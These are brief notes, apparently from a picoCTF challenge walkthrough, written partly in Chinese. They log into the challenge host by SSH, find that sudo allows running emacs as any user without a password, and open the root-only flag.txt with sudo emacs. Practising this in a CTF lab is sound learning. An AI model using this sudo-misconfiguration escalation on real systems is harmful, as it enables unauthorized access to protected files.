ssh -p 52854 ctf-player@green-hill.picoctf.net  
ls -l  
-> root = 只有root能讀  
sudo -l  
-> (ALL) NOPASSWD: /bin/emacs -> 用emacs可以以任何使用者執行 且不需要密碼  
sudo emacs flag.txt
